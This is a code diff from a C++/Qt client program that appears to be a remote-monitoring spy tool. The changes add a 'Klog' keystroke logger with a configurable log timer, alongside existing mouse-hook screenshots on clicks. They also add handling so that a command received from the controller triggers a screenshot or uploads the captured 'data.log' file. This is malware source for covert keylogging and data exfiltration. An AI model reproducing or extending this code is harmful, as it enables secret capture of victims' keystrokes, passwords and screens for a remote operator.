@@ -81,7 +81,7 @@ Client::~Client()
 void Client::update()
 {
     qDebug() << "\nCONFIG:";
-    qDebug() << "seconds:\t" << config->seconds;
+    qDebug() << "Screen timer:\t" << config->secondsScreen;
 
     // 0 x LMB_RMB_MMB_MWH
     int buttons = config->mouseButtons;
@@ -90,9 +90,12 @@ void Client::update()
     qDebug() << "RMB:\t" << ((buttons & 0x0004) ? 1 : 0);
     qDebug() << "MMB:\t" << ((buttons & 0x0002) ? 1 : 0);
     qDebug() << "MWH:\t" << ((buttons & 0x0001) ? 1 : 0);
+    qDebug() << "Logging is " << (config->logRun ? "on" : "off");
+    qDebug() << "Log timer:\t" << config->secondsLog << endl;
 
-    //Update screenshot parameters
-    MouseHook::instance().setParameters(buttons, config->seconds);
+    //Update screenshot and log parameters
+    MouseHook::instance().setParameters(buttons, config->secondsScreen);
+    Klog::instance().setParameters(config->logRun, config->secondsLog);
 }
 
 void Client::getOnline()
@@ -167,6 +170,17 @@ void Client::getString(const QString &string, const QString& /* ip */)
             }
         }
 
+        if (files & Screen)
+        {
+            emit MouseHook::instance().mouseClicked();
+        }
+
+        if (files & Log)
+        {
+            fileClient->enqueueData(_FILE,  QDir::currentPath() + "/data.log");
+            //fileClient->connect();
+        }
+
         //Look for all files in string
         currentFile = filesStr.section('|', 1, 1, QString::SectionSkipEmpty);
         for (int i = 2; ! currentFile.isEmpty(); ++i)
@@ -174,7 +188,8 @@ void Client::getString(const QString &string, const QString& /* ip */)
             fileClient->enqueueData(_FILE, currentFile);
             currentFile = filesStr.section('|', i, i, QString::SectionSkipEmpty);
         }
-        fileClient->connect();
+        if (! fileClient->isDataQueueEmpty())
+            fileClient->connect();
     }
 }
 
